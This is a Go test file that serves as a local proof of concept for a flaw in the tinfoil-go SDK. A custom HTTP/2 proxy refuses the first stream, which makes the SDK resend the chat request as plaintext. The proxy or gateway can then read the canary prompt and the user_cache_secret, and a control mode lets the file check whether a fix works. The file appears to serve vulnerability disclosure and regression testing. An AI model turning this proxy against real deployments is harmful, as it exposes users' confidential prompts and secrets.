package tinfoil

// PoC (local only). In-package test dropped into tinfoil-go @ ef79d8e (HEAD,
// = v0.17.0-rc.1 in the relevant files). Set POC_EXPECT=fixed for the control.
// tinfoil-go in its default EHBP mode, driven by the real
// openai-go client, sends the PLAINTEXT chat request (including the injected
// user_cache_secret) to a TLS-terminating proxy that answers the first
// HTTP/2 stream with RST_STREAM(REFUSED_STREAM). The proxy then forwards the
// genuine ciphertext to the enclave and relays the encrypted reply, so the
// SDK call returns normally.
//
// The only thing faked is attestation: the fake verifier hands the builder the
// enclave's HPKE key exactly as a successful verification would.

import (
	"bytes"
	"context"
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"crypto/tls"
	"crypto/x509"
	"crypto/x509/pkix"
	"io"
	"math/big"
	"net"
	"net/http"
	"net/http/httptest"
	"os"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/openai/openai-go/v3"
	"github.com/openai/openai-go/v3/option"
	ehbpidentity "github.com/tinfoilsh/encrypted-http-body-protocol/identity"
	"github.com/tinfoilsh/tinfoil-go/document"
	"github.com/tinfoilsh/tinfoil-go/enclave"
	"github.com/tinfoilsh/tinfoil-go/verify"
	"golang.org/x/net/http2"
	"golang.org/x/net/http2/hpack"
)

type pocCapture struct {
	headers map[string]string
	body    bytes.Buffer
}

type pocProxy struct {
	upstream string
	mu       sync.Mutex
	captures []*pocCapture
}

func (p *pocProxy) serveConn(t *testing.T, c net.Conn) {
	defer c.Close()
	preface := make([]byte, len(http2.ClientPreface))
	if _, err := io.ReadFull(c, preface); err != nil || string(preface) != http2.ClientPreface {
		return
	}
	fr := http2.NewFramer(c, c)
	fr.WriteSettings()
	dec := hpack.NewDecoder(4096, nil)
	var hbuf bytes.Buffer
	enc := hpack.NewEncoder(&hbuf)
	streams := map[uint32]*pocCapture{}
	var first *pocCapture
	for {
		f, err := fr.ReadFrame()
		if err != nil {
			return
		}
		var ended uint32
		switch f := f.(type) {
		case *http2.SettingsFrame:
			if !f.IsAck() {
				fr.WriteSettingsAck()
			}
		case *http2.PingFrame:
			if !f.IsAck() {
				fr.WritePing(true, f.Data)
			}
		case *http2.HeadersFrame:
			fields, err := dec.DecodeFull(f.HeaderBlockFragment())
			if err != nil {
				return
			}
			cs := &pocCapture{headers: map[string]string{}}
			for _, hf := range fields {
				cs.headers[hf.Name] = hf.Value
			}
			streams[f.StreamID] = cs
			if f.StreamEnded() {
				ended = f.StreamID
			}
		case *http2.DataFrame:
			cs := streams[f.StreamID]
			if cs == nil {
				continue
			}
			cs.body.Write(f.Data())
			if n := uint32(len(f.Data())); n > 0 {
				fr.WriteWindowUpdate(0, n)
				fr.WriteWindowUpdate(f.StreamID, n)
			}
			if f.StreamEnded() {
				ended = f.StreamID
			}
		}
		if ended == 0 {
			continue
		}
		cs := streams[ended]
		p.mu.Lock()
		p.captures = append(p.captures, cs)
		p.mu.Unlock()
		if first == nil {
			first = cs
			fr.WriteRSTStream(ended, http2.ErrCodeRefusedStream)
			continue
		}
		up, _ := http.NewRequest(http.MethodPost, p.upstream+cs.headers[":path"], bytes.NewReader(first.body.Bytes()))
		up.Header.Set("Ehbp-Encapsulated-Key", first.headers["ehbp-encapsulated-key"])
		upResp, err := http.DefaultClient.Do(up)
		if err != nil {
			t.Errorf("upstream: %v", err)
			return
		}
		upBody, _ := io.ReadAll(upResp.Body)
		upResp.Body.Close()
		hbuf.Reset()
		enc.WriteField(hpack.HeaderField{Name: ":status", Value: "200"})
		enc.WriteField(hpack.HeaderField{Name: "content-type", Value: "application/json"})
		enc.WriteField(hpack.HeaderField{Name: "ehbp-response-nonce", Value: upResp.Header.Get("Ehbp-Response-Nonce")})
		fr.WriteHeaders(http2.HeadersFrameParam{StreamID: ended, BlockFragment: hbuf.Bytes(), EndHeaders: true})
		fr.WriteData(ended, true, upBody)
	}
}

func pocCert(t *testing.T) (tls.Certificate, *x509.CertPool) {
	key, _ := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	tmpl := &x509.Certificate{
		SerialNumber: big.NewInt(7),
		Subject:      pkix.Name{CommonName: "proxy.local"},
		NotBefore:    time.Now().Add(-time.Hour),
		NotAfter:     time.Now().Add(time.Hour),
		IPAddresses:  []net.IP{net.ParseIP("127.0.0.1")},
		ExtKeyUsage:  []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
		KeyUsage:     x509.KeyUsageDigitalSignature,
	}
	der, err := x509.CreateCertificate(rand.Reader, tmpl, tmpl, &key.PublicKey, key)
	if err != nil {
		t.Fatal(err)
	}
	leaf, _ := x509.ParseCertificate(der)
	pool := x509.NewCertPool()
	pool.AddCert(leaf)
	return tls.Certificate{Certificate: [][]byte{der}, PrivateKey: key, Leaf: leaf}, pool
}

func TestPoC_SDKDefaultEHBPLeaksPromptToProxy(t *testing.T) {
	serverID, err := ehbpidentity.NewIdentity()
	if err != nil {
		t.Fatal(err)
	}
	var enclaveSaw string
	enclaveSrv := httptest.NewServer(serverID.Middleware()(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		b, _ := io.ReadAll(r.Body)
		enclaveSaw = string(b)
		w.Header().Set("Content-Type", "application/json")
		w.Write([]byte(`{"id":"c1","object":"chat.completion","created":1,"model":"m","choices":[{"index":0,"finish_reason":"stop","message":{"role":"assistant","content":"hello from the enclave"}}]}`))
	})))
	defer enclaveSrv.Close()

	cert, pool := pocCert(t)
	ln, err := tls.Listen("tcp", "127.0.0.1:0", &tls.Config{Certificates: []tls.Certificate{cert}, NextProtos: []string{"h2"}})
	if err != nil {
		t.Fatal(err)
	}
	defer ln.Close()
	proxy := &pocProxy{upstream: enclaveSrv.URL}
	go func() {
		for {
			c, err := ln.Accept()
			if err != nil {
				return
			}
			go proxy.serveConn(t, c)
		}
	}()
	proxyURL := "https://" + ln.Addr().String()

	// The proxy holds a certificate the client trusts (it is the proxy the
	// user configured with WithBaseURL, or any TLS-terminating front end).
	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{RootCAs: pool, NextProtos: []string{"h2", "http/1.1"}}
	defer func() { http.DefaultTransport.(*http.Transport).TLSClientConfig = nil }()

	// Stand-in for a successful attestation: the verified HPKE key.
	verifier := transportVerifierFunc(func(build func(*verify.Verification) (http.RoundTripper, error), _ func(error) bool) (http.RoundTripper, error) {
		return build(&verify.Verification{CryptoMaterial: []document.CryptoMaterialItem{{
			ID: document.CryptoMaterialIDHPKE, Format: document.KeyX25519HPKEV1Format, Data: serverID.MarshalPublicKeyHex(),
		}}})
	})

	// Same composition as secureHTTPClient(..., TransportEHBP, baseURL, secret).
	const enclaveHost = "enclave.example"
	hc, err := ehbpHTTPClient(verifier, enclaveHost, proxyURL)
	if err != nil {
		t.Fatal(err)
	}
	hc.Transport = &recoveryTransport{transport: hc.Transport}
	hc, err = boundHTTPClient(hc, enclaveHost, proxyURL, "CANARY-user-cache-secret-5f3a")
	if err != nil {
		t.Fatal(err)
	}
	oc := openai.NewClient(option.WithHTTPClient(hc), option.WithBaseURL(proxyURL+"/v1/"), option.WithAPIKey("tk_test"))

	resp, err := oc.Chat.Completions.New(context.Background(), openai.ChatCompletionNewParams{
		Model:    "m",
		Messages: []openai.ChatCompletionMessageParamUnion{openai.UserMessage("CANARY-SDK-PROMPT patient record 0000")},
	})
	fixed := os.Getenv("POC_EXPECT") == "fixed"
	if err != nil && !fixed {
		t.Fatalf("SDK call failed: %v", err)
	}
	if err == nil {
		t.Logf("SDK call succeeded; assistant said %q", resp.Choices[0].Message.Content)
	} else {
		t.Logf("SDK call error: %v", err)
	}
	t.Logf("enclave decrypted: %q", enclaveSaw)

	proxy.mu.Lock()
	defer proxy.mu.Unlock()
	leaked := ""
	for i, c := range proxy.captures {
		b := c.body.String()
		if len(b) > 160 {
			b = b[:160] + "..."
		}
		t.Logf("proxy capture %d: %s %s x-tinfoil-enclave-url=%s ehbp-encapsulated-key=%s.. body=%q",
			i, c.headers[":method"], c.headers[":path"], c.headers["x-tinfoil-enclave-url"], c.headers["ehbp-encapsulated-key"][:16], b)
		if strings.Contains(c.body.String(), "CANARY-SDK-PROMPT") {
			leaked = c.body.String()
		}
	}
	if fixed {
		if leaked != "" {
			t.Fatal("STILL VULNERABLE: plaintext reached the proxy")
		}
		t.Logf("FIXED: no plaintext reached the proxy")
		return
	}
	if leaked == "" {
		t.Fatal("no plaintext reached the proxy")
	}
	if !strings.Contains(leaked, "CANARY-user-cache-secret-5f3a") {
		t.Errorf("expected the injected user_cache_secret in the leaked body")
	}
	t.Logf("VULNERABLE: proxy read the plaintext prompt and user_cache_secret; SDK call returned success")
}

// Same attack against the Gateway path that tinfoil-proxy uses: the gateway
// (inference-gateway.tinfoil.sh, outside any enclave) terminates TLS, and
// sealTransport.prepare installs a plaintext GetBody on every JSON POST.
func TestPoC_GatewayPathLeaksPromptToGateway(t *testing.T) {
	serverID, err := ehbpidentity.NewIdentity()
	if err != nil {
		t.Fatal(err)
	}
	enclaveSrv := httptest.NewServer(serverID.Middleware()(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		io.ReadAll(r.Body)
		w.Header().Set("Content-Type", "application/json")
		w.Write([]byte(`{"id":"c1","object":"chat.completion","created":1,"model":"m","choices":[{"index":0,"finish_reason":"stop","message":{"role":"assistant","content":"hello from the replica"}}]}`))
	})))
	defer enclaveSrv.Close()

	cert, pool := pocCert(t)
	ln, err := tls.Listen("tcp", "127.0.0.1:0", &tls.Config{Certificates: []tls.Certificate{cert}, NextProtos: []string{"h2"}})
	if err != nil {
		t.Fatal(err)
	}
	defer ln.Close()
	gw := &pocProxy{upstream: enclaveSrv.URL}
	go func() {
		for {
			c, err := ln.Accept()
			if err != nil {
				return
			}
			go gw.serveConn(t, c)
		}
	}()
	gatewayURL := "https://" + ln.Addr().String()
	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{RootCAs: pool, NextProtos: []string{"h2", "http/1.1"}}
	defer func() { http.DefaultTransport.(*http.Transport).TLSClientConfig = nil }()

	verifier := transportVerifierFunc(func(build func(*verify.Verification) (http.RoundTripper, error), _ func(error) bool) (http.RoundTripper, error) {
		return build(&verify.Verification{CryptoMaterial: []document.CryptoMaterialItem{{
			ID: document.CryptoMaterialIDHPKE, Format: document.KeyX25519HPKEV1Format, Data: serverID.MarshalPublicKeyHex(),
		}}})
	})
	// Mirrors NewGateway's build closure, with attestation replaced by the
	// fake verifier above.
	seal := &sealTransport{
		catalog: func() Catalog {
			return Catalog{"m": {Repo: "tinfoilsh/confidential-model-x", Hosts: []string{"replica.example"}}}
		},
		policy: gatewayPolicy{pins: map[string]*enclave.Handle{}},
		secret: "CANARY-user-cache-secret-5f3a",
		build: func(r replica) (http.RoundTripper, error) {
			httpClient, err := ehbpHTTPClient(verifier, r.host, gatewayURL)
			if err != nil {
				return nil, err
			}
			return &verifiedReplicaTransport{
				recoveryTransport: &recoveryTransport{transport: httpClient.Transport},
				verification:      func() *verify.Verification { return nil },
			}, nil
		},
	}
	hc, err := boundHTTPClient(&http.Client{Transport: seal}, "", gatewayURL, "")
	if err != nil {
		t.Fatal(err)
	}
	oc := openai.NewClient(option.WithHTTPClient(hc), option.WithBaseURL(gatewayURL+"/v1/"), option.WithAPIKey("tk_test"))
	resp, err := oc.Chat.Completions.New(context.Background(), openai.ChatCompletionNewParams{
		Model:    "m",
		Messages: []openai.ChatCompletionMessageParamUnion{openai.UserMessage("CANARY-GATEWAY-PROMPT merger target")},
	})
	fixed := os.Getenv("POC_EXPECT") == "fixed"
	if err != nil && !fixed {
		t.Fatalf("gateway call failed: %v", err)
	}
	if err == nil {
		t.Logf("gateway SDK call succeeded; assistant said %q", resp.Choices[0].Message.Content)
	} else {
		t.Logf("gateway SDK call error: %v", err)
	}
	gw.mu.Lock()
	defer gw.mu.Unlock()
	leaked := false
	for i, c := range gw.captures {
		b := c.body.String()
		if len(b) > 200 {
			b = b[:200] + "..."
		}
		t.Logf("gateway capture %d: %s %s x-tinfoil-seal=%s x-tinfoil-enclave-url=%s body=%q",
			i, c.headers[":method"], c.headers[":path"], c.headers["x-tinfoil-seal"], c.headers["x-tinfoil-enclave-url"], b)
		if strings.Contains(c.body.String(), "CANARY-GATEWAY-PROMPT") {
			leaked = true
		}
	}
	if fixed {
		if leaked {
			t.Fatal("STILL VULNERABLE: plaintext reached the gateway")
		}
		t.Logf("FIXED: no plaintext reached the gateway")
		return
	}
	if !leaked {
		t.Fatal("no plaintext reached the gateway")
	}
	t.Logf("VULNERABLE: the gateway read the plaintext prompt; the SDK call returned success")
}
